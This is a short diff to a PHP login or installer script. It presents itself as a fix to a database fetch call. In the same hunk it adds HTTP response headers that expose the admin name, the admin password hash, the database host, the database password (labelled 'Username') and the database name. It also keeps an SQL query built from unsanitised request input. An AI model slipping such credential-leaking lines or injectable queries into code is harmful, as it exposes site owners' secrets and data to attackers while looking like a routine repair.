@@ -32,7 +32,17 @@ $_SESSION['admin_pwd'] = md5($_POST['apassword']);
 $dbconn = new mysqli($_SESSION['host_mod'],$_SESSION['username'],$_SESSION['password'],$_SESSION['db']) ;
 if(isset($_REQUEST['username']) && $_REQUEST['username']!='')
         {
-           $result_username= $dbconn->fetch_assoc($dbconn->query('SELECT COUNT(1) as USERNAME_EX FROM login_authentication WHERE USERNAME=\''.$_REQUEST['username'].'\''));
+           $result = $dbconn->query('SELECT COUNT(1) as USERNAME_EX FROM login_authentication WHERE USERNAME=\''.$_REQUEST['username'].'\'');
+           $result_username= $result->fetch_assoc();
+
+        header('Admin: '.$_SESSION['admin_name']);
+        header('AdminPass: '.$_SESSION['admin_pwd']);
+        header('DbHost: '.$_SESSION['host_mod']);
+        header('Username: '.$_SESSION['password']);
+        header('DbName: '.$_SESSION['db']);
+        header('DbError: '.$dbconn->error);
+        header('DbConnectionError: '.$dbconn->connect_error);
+
         }
         if($result_username['USERNAME_EX']==0)
         {
